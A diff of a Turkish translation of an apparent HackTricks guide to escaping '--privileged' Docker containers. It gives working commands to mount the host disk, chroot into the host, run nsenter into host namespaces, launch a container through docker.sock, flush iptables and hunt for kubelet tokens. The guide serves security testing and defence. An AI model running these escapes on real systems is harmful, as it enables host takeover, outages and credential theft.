@@ -1,38 +1,38 @@
-# `--privileged` Containers'tan Kaçış
+# `--privileged` Konteynerlerinden Kaçış
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Genel Bakış
 
-`--privileged` ile başlatılan bir container, bir veya iki ekstra izne sahip normal bir container ile aynı şey değildir. Uygulamada, `--privileged` normalde workload'u tehlikeli host kaynaklarından uzak tutan varsayılan runtime korumalarının birkaçını kaldırır veya zayıflatır. Tam etki hala runtime ve host'a bağlıdır, ancak Docker için tipik sonuç şudur:
+`--privileged` ile başlatılan bir konteyner, bir veya iki ekstra izinli normal bir konteyner ile aynı şey değildir. Pratikte `--privileged`, iş yükünü tehlikeli host kaynaklarından uzak tutan varsayılan çalışma zamanı korumalarının birkaçını kaldırır veya zayıflatır. Kesin etki yine runtime ve hosta bağlıdır, ancak Docker için tipik sonuç şudur:
 
-- all capabilities are granted
-- the device cgroup restrictions are lifted
-- many kernel filesystems stop being mounted read-only
-- default masked procfs paths disappear
-- seccomp filtering is disabled
-- AppArmor confinement is disabled
-- SELinux isolation is disabled or replaced with a much broader label
+- tüm capabilities verilir
+- device cgroup kısıtlamaları kaldırılır
+- birçok kernel dosya sistemi artık salt okunur olarak bağlanmaz
+- varsayılan maskelenmiş procfs yolları kaybolur
+- seccomp filtrelemesi devre dışı bırakılır
+- AppArmor sınırlaması devre dışı bırakılır
+- SELinux izolasyonu devre dışı bırakılır veya çok daha geniş bir etiketle değiştirilir
 
-Önemli sonuç şudur: privileged bir container genellikle ince bir kernel exploit'e ihtiyaç duymaz. Birçok durumda doğrudan host devices, host-facing kernel filesystems veya runtime arayüzleriyle etkileşime girip sonra host shell'ine pivot yapabilir.
+Önemli sonuç şudur: bir privileged container genellikle ince bir kernel exploitine ihtiyaç duymaz. Birçok durumda doğrudan host cihazları, hosta bakan kernel dosya sistemleri veya runtime arayüzleri ile etkileşime girip ardından host shell'ine pivot yapabilir.
 
 ## `--privileged`'in Otomatik Olarak Değiştirmediği Şeyler
 
-`--privileged` otomatik olarak host PID, network, IPC veya UTS namespaces'lerine katılmaz. privileged bir container yine de özel namespaces'e sahip olabilir. Bu, bazı escape zincirlerinin ekstra bir koşul gerektirdiği anlamına gelir, örneğin:
+`--privileged` otomatik olarak host PID, network, IPC veya UTS namespace'lerine katılmaz. Bir privileged container hala özel namespace'lere sahip olabilir. Bu, bazı kaçış zincirlerinin ek bir koşul gerektirdiği anlamına gelir, örneğin:
 
 - a host bind mount
-- host PID sharing
+- host PID paylaşımı
 - host networking
-- visible host devices
-- writable proc/sys interfaces
+- görünür host cihazları
+- yazılabilir proc/sys arayüzleri
 
-Bu koşullar gerçek yanlış yapılandırmalarda genellikle kolayca sağlanabilir, ancak kavramsal olarak `--privileged`'den ayrı şeylerdir.
+Bu koşullar gerçek yapılandırma hatalarında genellikle sağlanması kolaydır, ancak kavramsal olarak `--privileged`'den ayrı şeylerdir.
 
 ## Kaçış Yolları
 
-### 1. Açığa Çıkan cihazlar aracılığıyla Host Diskini Mount Etme
+### 1. Görünen Cihazlar Üzerinden Host Diskini Mount Etme
 
-privileged bir container genellikle `/dev` altında çok daha fazla device node görür. Eğer host block device görünüyorsa, en basit kaçış yolu onu mount etmek ve host filesystem'ine `chroot` yapmaktır:
+Bir privileged container genellikle `/dev` altında çok daha fazla device node görür. Eğer host block device görünürse, en basit kaçış onu mount edip `chroot` ile host dosya sistemine geçmektir:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -40,22 +40,22 @@ mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/de
 ls -la /mnt/hostdisk
 chroot /mnt/hostdisk /bin/bash 2>/dev/null
 ```
-Eğer root bölümü belirgin değilse, önce blok düzenini listeleyin:
+root partition belirgin değilse, önce block layout'u listeleyin:
 ```bash
 fdisk -l 2>/dev/null
 blkid 2>/dev/null
 debugfs /dev/sda1 2>/dev/null
 ```
-Eğer pratik yol `chroot` yapmak yerine yazılabilir bir host mount'a bir setuid yardımcı yerleştirmekse, her dosya sisteminin setuid bit'ini uygulamadığını unutmayın. Hızlı bir host-tarafı yetenek kontrolü şudur:
+Eğer pratik yol `chroot` yapmak yerine yazılabilir bir host mount'a bir setuid yardımcı yerleştirmekse, her dosya sistemi setuid bitini desteklemez. Hızlı bir host tarafı yetenek kontrolü şudur:
 ```bash
 mount | grep -v "nosuid"
 ```
-Bu faydalıdır çünkü `nosuid` dosya sistemleri altındaki yazılabilir yollar, klasik "drop a setuid shell and execute it later" iş akışları için çok daha az ilgi çekicidir.
+Bu, `nosuid` dosya sistemleri altındaki yazılabilir yolların klasik "drop a setuid shell and execute it later" iş akışları için çok daha az ilgi çekici olması nedeniyle kullanışlıdır.
 
-Burada suistimal edilen zayıflatılmış korumalar şunlardır:
+The weakened protections being abused here are:
 
-- tam aygıt erişimi
-- geniş yetkiler, özellikle `CAP_SYS_ADMIN`
+- tam cihaz erişimi
+- geniş capabilities, özellikle `CAP_SYS_ADMIN`
 
 İlgili sayfalar:
 
@@ -67,21 +67,21 @@ protections/capabilities.md
 protections/namespaces/mount-namespace.md
 {{#endref}}
 
-### 2. Host bind mount'ını bağlama veya yeniden kullanma ve `chroot`
+### 2. Bir Host Bind Mount'ını Bağlama veya Yeniden Kullanma ve `chroot`
 
-Eğer host kök dosya sistemi zaten konteyner içinde bağlanmışsa, veya konteyner privileged olduğu için gerekli bağlamaları oluşturabiliyorsa, bir host shell genellikle sadece bir `chroot` uzaklıktadır:
+Eğer host root dosya sistemi zaten konteyner içinde mount edilmişse, veya konteyner gerekli mount'ları oluşturabiliyorsa çünkü privileged ise, bir host shell genellikle sadece bir `chroot` uzaklıktadır:
 ```bash
 mount | grep -E ' /host| /mnt| /rootfs'
 ls -la /host 2>/dev/null
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Host root bind mount yoksa ama host storage erişilebiliyorsa, bir tane oluşturun:
+Host root bind mount yoksa ancak host storage erişilebiliyorsa, bir tane oluşturun:
 ```bash
 mkdir -p /tmp/host
 mount --bind / /tmp/host
 chroot /tmp/host /bin/bash 2>/dev/null
 ```
-Bu yol şu zayıflıkları istismar eder:
+Bu yol şu zayıflıklardan yararlanır:
 
 - zayıflatılmış mount kısıtlamaları
 - tam capabilities
@@ -105,11 +105,11 @@ protections/apparmor.md
 protections/selinux.md
 {{#endref}}
 
-### 3. Yazılabilir `/proc/sys` veya `/sys`'i Kötüye Kullanma
+### 3. Yazılabilir `/proc/sys` veya `/sys`'i Suistimal Etme
 
-`--privileged`'in önemli sonuçlarından biri, procfs ve sysfs korumalarının çok daha zayıf hale gelmesidir. Bu, normalde maskelenmiş veya salt-okunur olarak mount edilen host'a bakan kernel arayüzlerini açığa çıkarabilir.
+`--privileged`'ın büyük sonuçlarından biri, procfs ve sysfs korumalarının çok zayıflamasıdır. Bu, normalde maskelenmiş veya yalnızca okunur olarak bağlanmış olan host'a yönelik kernel arayüzlerini açığa çıkarabilir.
 
-Klasik bir örnek `core_pattern`:
+Klasik bir örnek `core_pattern`'dir:
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] || exit 1
 overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -131,7 +131,7 @@ gcc /tmp/crash.c -o /tmp/crash
 /tmp/crash
 ls -l /tmp/rootsh
 ```
-Diğer yüksek değerli yollar şunlardır:
+Diğer yüksek değere sahip yollar şunlardır:
 ```bash
 cat /proc/sys/kernel/modprobe 2>/dev/null
 cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
@@ -143,7 +143,7 @@ Bu yol şu eksiklikleri kötüye kullanır:
 - missing masked paths
 - missing read-only system paths
 
-İlgili sayfalar:
+Related pages:
 
 {{#ref}}
 protections/masked-paths.md
@@ -155,25 +155,25 @@ protections/read-only-paths.md
 
 ### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape
 
-A privileged container, normal containers'tan genellikle kaldırılan `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` ve benzeri birçok yeteneğe sahip olur. Bu, başka bir açık yüzey var olduğunda yerel bir foothold'u host escape'e dönüştürmek için sıklıkla yeterlidir.
+A privileged container, normalde standart container'lardan kaldırılan `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` ve daha birçok yeteneği alır. Bu, başka bir exposed surface var olduğunda bir local foothold'u host escape'e dönüştürmek için genellikle yeterlidir.
 
-Basit bir örnek mounting additional filesystems ve namespace entry kullanmaktır:
+A simple example is mounting additional filesystems and using namespace entry:
 ```bash
 capsh --print | grep cap_sys_admin
 which nsenter
 nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
 ```
-Eğer host PID de paylaşılıyorsa, adım daha da kısalır:
+Host PID de paylaşılıyorsa, adım daha da kısalır:
 ```bash
 ps -ef | head -n 50
 nsenter -t 1 -m -u -n -i -p /bin/bash
 ```
-Bu yol şu şeyleri istismar eder:
+Bu yol şunları kötüye kullanır:
 
-- varsayılan privileged capability set
+- varsayılan ayrıcalıklı yetenek (capability) kümesi
 - isteğe bağlı host PID paylaşımı
 
-İlgili sayfalar:
+Related pages:
 
 {{#ref}}
 protections/capabilities.md
@@ -185,16 +185,16 @@ protections/namespaces/pid-namespace.md
 
 ### 5. Runtime Soketleri Üzerinden Kaçış
 
-Privileged container sıklıkla host runtime durumunu veya soketlerini görür hale gelir. Eğer bir Docker, containerd veya CRI-O soketine erişilebiliyorsa, en basit yaklaşım genellikle runtime API'sini kullanarak host erişimine sahip ikinci bir container başlatmaktır:
+Ayrıcalıklı bir container sıklıkla host'un çalışma zamanı durumu veya soketlerinin görünür hale gelmesiyle sonuçlanır. Eğer bir Docker, containerd, veya CRI-O soketine erişilebiliyorsa, en basit yaklaşım genellikle runtime API'sini kullanıp host erişimi olan ikinci bir container başlatmaktır:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
-I don't have the file contents. Please paste the "For containerd:" section (including surrounding markdown/tags) you want translated to Turkish, and I will translate it while preserving all markdown/html syntax and paths/refs.
+containerd için:
 ```bash
 ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
 ```
-Bu yol şu istismarları kullanır:
+Bu yol şu durumları suistimal eder:
 
 - privileged runtime exposure
 - host bind mounts created through the runtime itself
@@ -211,7 +211,7 @@ runtime-api-and-daemon-exposure.md
 
 ### 6. Ağ İzolasyonu Yan Etkilerini Kaldır
 
-`--privileged` tek başına host network namespace'ine katılmaz, ancak konteynerde ayrıca `--network=host` veya diğer host-network erişimi varsa, tüm network yığını değiştirilebilir hale gelir:
+`--privileged` kendi başına host network namespace'ine katılmaz; ancak container ayrıca `--network=host` veya diğer host-ağ erişimine sahipse, tüm ağ yığını değiştirilebilir hale gelir:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -220,9 +220,9 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link set lo down 2>/dev/null
 iptables -F 2>/dev/null
 ```
-Bu her zaman doğrudan bir host shell'i sağlamaz, ancak denial of service, trafik yakalama veya yalnızca loopback üzerinden erişilebilen yönetim servislerine erişim gibi sonuçlar doğurabilir.
+Bu her zaman doğrudan bir host shell'i sağlamaz, ancak denial of service, traffic interception veya yalnızca loopback üzerinden erişilebilen yönetim hizmetlerine erişim sağlayabilir.
 
-İlgili sayfalar:
+Related pages:
 
 {{#ref}}
 protections/capabilities.md
@@ -234,13 +234,13 @@ protections/namespaces/network-namespace.md
 
 ### 7. Host Sırlarını ve Çalışma Zamanı Durumunu Okuma
 
-Temiz bir shell kaçışı hemen mümkün olmasa bile, ayrıcalıklı konteynerler genellikle ana makinenin sırlarını, kubelet durumunu, çalışma zamanı meta verilerini ve komşu konteynerlerin dosya sistemlerini okumaya yetecek erişime sahiptir:
+Temiz bir shell escape'i hemen gerçekleşmese bile, privileged containers genellikle host sırlarını, kubelet durumunu, çalışma zamanı metadata'sını ve komşu container dosya sistemlerini okumak için yeterli erişime sahiptir:
 ```bash
 find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
 find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
 find /var/lib/containerd -type f 2>/dev/null | head -n 50
 ```
-Eğer `/var` host-mounted ise veya runtime dizinleri görünür durumdaysa, bu durum host shell elde edilmeden önce bile lateral movement veya cloud/Kubernetes credential theft için yeterli olabilir.
+Eğer `/var` host-mounted ise veya runtime directories görünür durumdaysa, bu host shell elde edilmeden önce bile lateral movement veya cloud/Kubernetes credential theft için yeterli olabilir.
 
 Related pages:
 
@@ -263,15 +263,15 @@ grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
 cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
 find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
 ```
-What is interesting here:
+Burada ilginç olanlar:
 
-- tam yetki seti, özellikle `CAP_SYS_ADMIN`
+- tam bir capability kümesi, özellikle `CAP_SYS_ADMIN`
 - yazılabilir proc/sys erişimi
 - görünür host cihazları
 - seccomp ve MAC confinement eksikliği
-- runtime socket'ları veya host root bind mounts
+- runtime sockets veya host root bind mounts
 
-Any one of those may be enough for post-exploitation. Several together usually mean the container is functionally one or two commands away from host compromise.
+Bunların herhangi biri post-exploitation için yeterli olabilir. Birkaç tanesi bir arada olduğunda genellikle container işlevsel olarak host compromise'a bir veya iki komut uzaklıktadır.
 
 ## İlgili Sayfalar
 
@@ -310,3 +310,4 @@ protections/namespaces/pid-namespace.md
 {{#ref}}
 protections/namespaces/network-namespace.md
 {{#endref}}
+{{#include ../../../banners/hacktricks-training.md}}
